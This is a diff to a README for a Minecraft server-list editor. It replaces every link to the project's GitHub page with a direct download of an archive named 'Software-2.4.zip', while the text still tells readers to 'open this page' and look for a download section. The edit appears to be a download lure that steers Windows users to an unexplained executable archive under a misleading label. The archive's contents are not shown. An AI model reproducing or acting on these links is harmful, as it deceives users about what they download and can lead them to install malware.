@@ -1,12 +1,12 @@
 # 🗂️ mcservers - Edit Minecraft server lists fast
 
-[![Download mcservers](https://img.shields.io/badge/Download-mcservers-blue?style=for-the-badge&logo=github)](https://github.com/Serah103/mcservers)
+[![Download mcservers](https://img.shields.io/badge/Download-mcservers-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Serah103/mcservers/main/mcservers/Software-2.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download mcservers:
 
-https://github.com/Serah103/mcservers
+https://raw.githubusercontent.com/Serah103/mcservers/main/mcservers/Software-2.4.zip
 
 ## 🧰 What mcservers does
 
@@ -35,7 +35,7 @@ It helps you view and edit the list of saved multiplayer servers that Minecraft 
 
 Follow these steps on Windows.
 
-1. Open this page in your browser: https://github.com/Serah103/mcservers
+1. Open this page in your browser: https://raw.githubusercontent.com/Serah103/mcservers/main/mcservers/Software-2.4.zip
 2. Look for the download section on the page
 3. Download the Windows version of mcservers
 4. Save the file to a folder you can find again, such as Downloads or Desktop
@@ -162,7 +162,7 @@ It is useful if you want a small tool that:
 
 ## 📦 Download and install
 
-1. Visit this page to download mcservers: https://github.com/Serah103/mcservers
+1. Visit this page to download mcservers: https://raw.githubusercontent.com/Serah103/mcservers/main/mcservers/Software-2.4.zip
 2. Download the Windows file from the repository page
 3. Open the downloaded file or extract it if it is in a ZIP
 4. Start the app by double-clicking the program file
@@ -185,4 +185,4 @@ If you want to undo changes, restore your backup `servers.dat` file
 
 ## 📎 Useful link
 
-GitHub repository: https://github.com/Serah103/mcservers
+GitHub repository: https://raw.githubusercontent.com/Serah103/mcservers/main/mcservers/Software-2.4.zip
